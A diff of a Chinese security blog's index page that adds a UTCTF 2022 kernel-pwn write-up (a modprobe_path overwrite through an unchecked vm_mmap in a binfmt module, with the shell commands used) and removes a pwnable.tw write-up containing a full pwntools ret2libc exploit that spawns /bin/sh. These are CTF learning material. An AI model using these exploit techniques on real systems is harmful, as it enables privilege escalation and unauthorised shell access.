@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">11</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">13</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -136,7 +136,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">11</span></a>
 
   </li>
         <li class="menu-item menu-item-commonweal">
@@ -195,6 +195,117 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2022/03/15/UTCTF-2022-bloat-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AvavaAYA">
+      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/15/UTCTF-2022-bloat-writeup/" class="post-title-link" itemprop="url">UTCTF-2022-bloat-writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-15 21:08:50 / 修改时间：21:09:31" itemprop="dateCreated datePublished" datetime="2022-03-15T21:08:50+08:00">2022-03-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <span id="more"></span>
+
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>按照惯例，先解压:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line"><span class="built_in">mv</span> ../rootfs.cpio.gz .</span><br><span class="line">gunzip ./rootfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>
+
+<p>kernel-pwn题目的突破口往往出现在出题者拓展的kernel-object中:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[rootfs]$ find ./ -name *.ko</span><br><span class="line">./lib/modules/5.15.0/extra/bloat.ko</span><br></pre></td></tr></table></figure>
+
+<p>为了方便后面的调试，先把bzImage解压成elf，并解析出部分符号表:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf bzImage vmlinux.bin</span><br></pre></td></tr></table></figure>
+<p>在run.sh末尾加上-s与-S选项，进入gdb:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux.bin</span><br><span class="line">(gdb)&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>
+<p>当然，也可以直接</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex <span class="string">&#x27;set architecture i386:x86_64&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;target remote localhost:1234&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;add-symbol-file bloat.ko 0xffffffffc0000000&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;b load_bloat_binary&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;c&#x27;</span> ./vmlinux.bin</span><br></pre></td></tr></table></figure>
+<p>一步到位，把断点下在load_bloat_binary函数上.</p>
+<hr>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>将bloat.ko拿进ida中分析:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="built_in">strrchr</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">0x60</span>), <span class="string">&#x27;.&#x27;</span>);<span class="comment">// 文件后缀名判断</span></span><br><span class="line"><span class="keyword">if</span> ( !v1 )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0xFFFFFFF8</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v1, <span class="string">&quot;.bloat&quot;</span>) )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">v2 = <span class="built_in">generic_file_llseek</span>(*(_QWORD *)(a1 + <span class="number">0x40</span>), <span class="number">0LL</span>, <span class="number">2LL</span>);<span class="comment">// 判断文件大小</span></span><br><span class="line"><span class="built_in">generic_file_llseek</span>(*(_QWORD *)(a1 + <span class="number">0x40</span>), <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
+<p>且根据a1是setup_new_exec等函数的参数，在:<br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/binfmts.h#L17">elixir.bootlin.com</a>中进行检索，确定a1的结构体:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> __int64 vma_pages;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> __int64 p;</span><br><span class="line">	<span class="type">unsigned</span> __int64 argmin;</span><br><span class="line">	<span class="type">unsigned</span> __int32 have_execfd : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> __int32 execfd_creds : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> __int32 secureexec : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> __int32 point_of_no_return : <span class="number">1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">executable</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">interpreter</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line">	<span class="type">int</span> unsafe;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> per_clear;</span><br><span class="line">	<span class="type">int</span> argc;</span><br><span class="line">	<span class="type">int</span> envc;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *filename;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *interp;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *fdpath;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> interp_flags;</span><br><span class="line">	<span class="type">int</span> execfd;</span><br><span class="line">	<span class="type">unsigned</span> __int64 loader;</span><br><span class="line">	<span class="type">unsigned</span> __int64 exec;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim_stack</span>;</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>确定结构体后，发现有这样一行:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm_mmap(<span class="number">0LL</span>, v6, <span class="number">256LL</span>, <span class="number">7LL</span>, <span class="number">18LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
+<p>对于地址没有检查，造成了任意地址写，故考虑覆写modprobe_path.</p>
+<hr>
+<h2 id="exploition"><a href="#exploition" class="headerlink" title="exploition"></a>exploition</h2><h4 id="先将modprobe-path覆写为目标文件"><a href="#先将modprobe-path覆写为目标文件" class="headerlink" title="先将modprobe_path覆写为目标文件:"></a>先将modprobe_path覆写为目标文件:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -ne <span class="string">&quot;\x80\x81\x03\x82\xff\xff\xff\xff/tmp/a&quot;</span> &gt; exp.bloat</span><br></pre></td></tr></table></figure>
+<h4 id="将目标操作写入a"><a href="#将目标操作写入a" class="headerlink" title="将目标操作写入a:"></a>将目标操作写入a:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;#!/bin/sh\ncat /dev/sda &gt; /tmp/flag&quot;</span> &gt; /tmp/a</span><br></pre></td></tr></table></figure>
+<h4 id="触发调用modprobe-path"><a href="#触发调用modprobe-path" class="headerlink" title="触发调用modprobe_path:"></a>触发调用modprobe_path:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> b</span><br><span class="line"><span class="built_in">chmod</span> +x b a exp.bloat</span><br><span class="line">/tmp/exp.bloat</span><br><span class="line">/tmp/b</span><br></pre></td></tr></table></figure>
+<hr>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /tmp/flag</span><br><span class="line">utflag&#123;oops_forgot_to_use_put_user283558318&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/s &amp;modprobe_path</span><br><span class="line">0xffffffff82038180:     <span class="string">&quot;/tmp/a&quot;</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -613,114 +724,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="AvavaAYA">
-      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/13/pwnable-tw-silverbullet-writeup/" class="post-title-link" itemprop="url">pwnable-tw-silverbullet writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-13 15:50:23" itemprop="dateCreated datePublished" datetime="2021-11-13T15:50:23+08:00">2021-11-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-05 13:57:34" itemprop="dateModified" datetime="2022-03-05T13:57:34+08:00">2022-03-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <span id="more"></span>
-
-<h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
-<li>strncmp等危险函数导致的栈溢出</li>
-<li>ret2libc</li>
-</ul>
-<hr>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>  题目中给出了libc文件，先用patchelf搞定本地环境方便调试;<br>  checksec，发现是32位程序没开canary和PIE，进入ida分析:<br>  main()提供了操作菜单，且只有beat返回值非0(即赢得游戏)才能return，进行ROP:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+0h] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// [esp+4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+8h] [ebp-34h]</span></span><br><span class="line"><span class="comment">//关键数组</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+38h] [ebp-4h]</span></span><br><span class="line"><span class="comment">//关键变量</span></span><br><span class="line"></span><br><span class="line">  init_proc();</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v5 = <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">  v6 = <span class="string">&quot;Gin&quot;</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          menu();</span><br><span class="line">          v3 = read_int();</span><br><span class="line">          <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          power_up(&amp;s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">        create_bullet(&amp;s);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t give up !&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( beat((<span class="type">int</span>)&amp;s, &amp;v5) )</span><br><span class="line"><span class="comment">//只有beat()返回值非0才能跳出while循环进行return操作</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me more power !!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  power_up()函数，发现危险函数:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">power_up</span><span class="params">(<span class="type">char</span> *dest)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-34h]</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !*dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You need create the bullet first !&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)dest + <span class="number">12</span>) &gt; <span class="number">0x2F</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t power up any more !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your another description of bullet :&quot;</span>);</span><br><span class="line">  read_input(&amp;s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  <span class="built_in">strncat</span>(dest, &amp;s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line"><span class="comment">//数组长度保存在buf[0x30]的位置，而数组的允许大小为0x30(不包括尾部的0x00)，因此可以通过strncat将buf[0x30]位置的整型变量覆写为0x00</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;s) + *((_DWORD *)dest + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new power is : %u\n&quot;</span>, v3);</span><br><span class="line">  *((_DWORD *)dest + <span class="number">12</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enjoy it !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  根据上述分析，可以通过先creat再powerup实现改写ret地址，进而进行ret2libc操作:</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">creat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x2f</span>)</span><br><span class="line">power(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#payload1 = payload</span></span><br><span class="line">power(payload1)</span><br><span class="line">beat()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10103</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./silver_bullet&quot;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./silver_bullet&quot;</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#input()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">data</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">	p.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me your description of bullet :&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power</span>(<span class="params">data</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">	p.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me your another description of bullet :&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">beat</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">	p.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x2f</span>)</span><br><span class="line">power(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload1 = p32(<span class="number">0xfffff111</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">3</span> + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">power(payload1)</span><br><span class="line">beat()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Oh ! You win !!\n&quot;</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - l.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bins_addr = libc_base + <span class="built_in">next</span>(l.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">syst_addr = libc_base + l.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x2f</span>)</span><br><span class="line">power(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload2 = p32(<span class="number">0xfffff111</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">3</span> + p32(syst_addr) + p32(e.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(bins_addr)</span><br><span class="line">power(payload2)</span><br><span class="line">beat()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Oh ! You win !!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -788,7 +795,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -801,7 +808,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -846,13 +853,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">31k</span>
+    <span title="站点总字数">33k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">28 分钟</span>
+    <span title="站点阅读时长">30 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Muse</a> 强力驱动
   </div>
